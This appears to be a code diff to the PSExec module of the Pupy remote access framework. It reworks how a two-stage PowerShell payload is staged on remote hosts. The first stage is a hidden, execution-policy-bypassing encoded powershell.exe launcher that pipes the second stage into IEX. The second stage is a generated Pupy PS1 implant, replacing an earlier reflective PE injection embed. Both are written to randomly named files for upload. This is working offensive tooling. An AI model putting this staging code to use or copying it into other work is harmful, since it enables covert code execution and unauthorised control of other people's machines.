@@ -10,7 +10,6 @@ import tempfile
 import random
 import string
 from rpyc.utils.classic import upload
-from pupylib.payloads.ps1_oneliner import create_ps_command, getInvokeReflectivePEInjectionWithDLLEmbedded
 import shutil
 from subprocess import PIPE, Popen
 import time
@@ -97,18 +96,21 @@ class PSExec(PupyModule):
             # if uploading powershell
             else:
                 ext = '.txt'
-                first_stage = ''.join(random.sample(string.ascii_letters, 10)) + ext
-                second_stage = ''.join(random.sample(string.ascii_letters, 10)) + ext
-                file_to_upload = [first_stage, second_stage]
+                first_stage     = ''.join(random.sample(string.ascii_letters, 10)) + ext
+                second_stage    = ''.join(random.sample(string.ascii_letters, 10)) + ext
+                file_to_upload  = [first_stage, second_stage]
 
                 launcher = """cat {invoke_reflective_random_name} | Out-String | IEX""".format(invoke_reflective_random_name=dst_folder + second_stage)
-                launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
-                open(tmp_dir + os.sep + first_stage, 'w').write(launcher)
-                self.success('first stage created: %s' % tmp_dir + os.sep + first_stage)
+                launcher = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(launcher.encode('UTF-16LE')))
+                open(os.path.join(tmp_dir, first_stage), 'w').write(launcher)
+                self.success('first stage created: %s' % os.path.join(tmp_dir, first_stage))
 
-                command = getInvokeReflectivePEInjectionWithDLLEmbedded(self.client.get_conf())
-                open(tmp_dir + os.sep + second_stage, 'w').write(command)
-                self.success('second stage created: %s' % tmp_dir + os.sep + second_stage)
+                tmpfile = tempfile.gettempdir()
+                output  = pupygen.generate_ps1(self.config, output_dir=tmpfile, all=True)
+                command = output.read()
+                
+                open(os.path.join(tmp_dir, second_stage), 'w').write(command)
+                self.success('second stage created: %s' % os.path.join(tmp_dir, second_stage))
 
             for file in file_to_upload:
                 src = tmp_dir + os.sep + file
